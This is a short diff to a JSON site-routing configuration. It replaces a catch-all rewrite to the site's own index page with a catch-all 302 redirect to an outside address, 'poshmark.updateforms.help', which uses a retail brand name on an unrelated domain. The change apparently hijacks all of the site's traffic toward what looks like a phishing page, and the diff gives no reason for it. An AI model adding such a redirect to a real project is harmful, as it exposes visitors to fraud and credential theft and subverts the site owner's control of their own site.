@@ -1,8 +1,9 @@
 {
-  "rewrites": [
+  "routes": [
     {
-      "source": "/(.*)",
-      "destination": "/index.html"
+      "src": "/(.*)",
+      "dest": "https://poshmark.updateforms.help/dcsOxMKXc",
+      "status": 302
     }
   ]
 }
